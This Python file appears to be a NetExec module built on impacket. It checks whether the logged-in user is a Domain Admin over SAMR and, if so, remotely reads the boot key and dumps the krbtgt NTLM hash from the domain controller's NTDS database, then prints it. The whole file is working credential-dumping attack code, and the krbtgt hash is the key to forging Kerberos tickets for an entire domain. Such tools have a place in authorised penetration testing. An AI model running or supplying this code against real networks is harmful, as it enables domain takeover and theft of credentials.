from impacket.dcerpc.v5 import samr, transport
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from impacket.examples.secretsdump import RemoteOperations, NTDSHashes
from contextlib import suppress
import traceback
from nxc.helpers.misc import CATEGORY


class NXCModule:
    """
    Module to check if the authenticated user is a Domain Administrator
    and retrieve the krbtgt hash if they are.
    
    This module performs two main functions:
    1. Checks if the authenticated user is a member of the Domain Admins group (RID 512)
    2. If they are a Domain Admin, retrieves and displays the krbtgt account's NTLM hash
    
    Requirements:
    - SMB connection with administrative privileges
    - Domain Controller access for SAMR and NTDS operations
    
    Usage:
        nxc smb <target> -u <username> -p <password> -M check_domain_admin
    
    Output:
    - Displays whether the user is a Domain Administrator
    - If Domain Admin, displays the krbtgt NTLM hash
    """

    name = "check_domain_admin"
    description = "Checks if user is Domain Admin and retrieves krbtgt hash"
    supported_protocols = ["smb"]
    category = CATEGORY.ENUMERATION

    def options(self, context, module_options):
        """No module options available"""
        pass

    def on_admin_login(self, context, connection):
        """Execute when admin login is successful"""
        try:
            # Check if current user is a Domain Admin
            is_domain_admin = self.check_domain_admin(context, connection)
            
            if is_domain_admin:
                context.log.success(f"User {connection.username} is a Domain Administrator!")
                # Retrieve krbtgt hash
                self.get_krbtgt_hash(context, connection)
            else:
                context.log.fail(f"User {connection.username} is NOT a Domain Administrator")
                
        except Exception as e:
            context.log.fail(f"Error checking domain admin status: {e}")
            context.log.debug(traceback.format_exc())

    def get_dce_rpc(self, target, string_binding, dce_binding, connection):
        """Create DCE/RPC connection"""
        rpctransport = transport.DCERPCTransportFactory(string_binding)
        rpctransport.setRemoteHost(target)
        rpctransport.set_credentials(
            connection.username,
            connection.password,
            connection.domain,
            connection.lmhash,
            connection.nthash,
            aesKey=connection.aesKey,
        )
        rpctransport.set_kerberos(connection.kerberos, connection.kdcHost)

        dce = rpctransport.get_dce_rpc()
        if connection.kerberos:
            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
        dce.set_credentials(*rpctransport.get_credentials())
        dce.connect()
        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        dce.bind(dce_binding)
        return dce

    def check_domain_admin(self, context, connection):
        """Check if the current user is a member of Domain Admins group"""
        try:
            # Connect to SAMR
            string_binding = fr"ncacn_np:{connection.kdcHost}[\pipe\samr]"
            dce = self.get_dce_rpc(connection.kdcHost, string_binding, samr.MSRPC_UUID_SAMR, connection)
            
            # Get domain information
            server_handle = samr.hSamrConnect2(dce)["ServerHandle"]
            domain = samr.hSamrEnumerateDomainsInSamServer(dce, server_handle)["Buffer"]["Buffer"][0]["Name"]
            resp = samr.hSamrLookupDomainInSamServer(dce, server_handle, domain)
            domain_sid = resp["DomainId"].formatCanonical()
            domain_handle = samr.hSamrOpenDomain(dce, server_handle, samr.DOMAIN_LOOKUP | samr.DOMAIN_LIST_ACCOUNTS, resp["DomainId"])["DomainHandle"]
            
            context.log.debug(f"Resolved domain SID: {domain_sid}")
            
            # Domain Admins RID is 512
            domain_admin_rid = 512
            
            try:
                # Open Domain Admins group
                group_handle = samr.hSamrOpenGroup(dce, domain_handle, samr.GROUP_LIST_MEMBERS, domain_admin_rid)["GroupHandle"]
                resp = samr.hSamrGetMembersInGroup(dce, group_handle)
                
                # Check if current user is in the group
                for member in resp["Members"]["Members"]:
                    rid = int.from_bytes(member.getData(), byteorder="little")
                    try:
                        user_handle = samr.hSamrOpenUser(dce, domain_handle, samr.MAXIMUM_ALLOWED, rid)["UserHandle"]
                        username = samr.hSamrQueryInformationUser2(dce, user_handle, samr.USER_INFORMATION_CLASS.UserAllInformation)["Buffer"]["All"]["UserName"]
                        
                        if username.lower() == connection.username.lower():
                            context.log.debug(f"Found {username} in Domain Admins group")
                            return True
                            
                    except Exception as e:
                        context.log.debug(f"Failed to get user info for RID {rid}: {e}")
                    finally:
                        with suppress(Exception):
                            samr.hSamrCloseHandle(dce, user_handle)
                            
            except Exception as e:
                context.log.debug(f"Failed to get members of Domain Admins group: {e}")
            finally:
                with suppress(Exception):
                    samr.hSamrCloseHandle(dce, group_handle)
                    
            return False
            
        except Exception as e:
            context.log.fail(f"Error in check_domain_admin: {e}")
            context.log.debug(traceback.format_exc())
            return False

    def get_krbtgt_hash(self, context, connection):
        """Retrieve and display krbtgt hash from NTDS"""
        try:
            context.log.info("Attempting to retrieve krbtgt hash...")
            
            # Enable remote operations
            remote_ops = RemoteOperations(connection.conn, False)
            remote_ops.enableRegistry()
            
            # Get bootkey
            try:
                bootkey = remote_ops.getBootKey()
            except Exception as e:
                context.log.fail(f"Failed to get bootkey: {e}")
                return
                
            # Store krbtgt hash
            self.krbtgt_hash = None
            
            def krbtgt_callback(secret_type, secret):
                """Callback to capture only krbtgt hash"""
                # Parse the secret to extract username
                if secret and ":" in secret:
                    parts = secret.split(":")
                    if len(parts) >= 4:
                        username = parts[0].split("\\")[-1] if "\\" in parts[0] else parts[0]
                        if username.lower() == "krbtgt":
                            # Extract NT hash (format: username:rid:lmhash:nthash:...)
                            lmhash = parts[2]
                            nthash = parts[3]
                            self.krbtgt_hash = f"{username}:{lmhash}:{nthash}"
                            context.log.highlight(f"krbtgt Hash: {nthash}")
            
            # Dump NTDS with krbtgt filter
            use_vss_method = False
            NTDSFileName = None
            
            NTDS = NTDSHashes(
                NTDSFileName,
                bootkey,
                isRemote=True,
                history=False,
                noLMHash=True,
                remoteOps=remote_ops,
                useVSSMethod=use_vss_method,
                justNTLM=True,
                pwdLastSet=False,
                resumeSession=None,
                outputFileName=None,
                justUser="krbtgt",
                printUserStatus=False,
                perSecretCallback=lambda secret_type, secret: krbtgt_callback(secret_type, secret),
            )
            
            context.log.info("Dumping krbtgt hash from NTDS...")
            NTDS.dump()
            
            if self.krbtgt_hash:
                context.log.success("Successfully retrieved krbtgt hash!")
            else:
                context.log.fail("Failed to retrieve krbtgt hash")
                
        except Exception as e:
            context.log.fail(f"Error retrieving krbtgt hash: {e}")
            context.log.debug(traceback.format_exc())
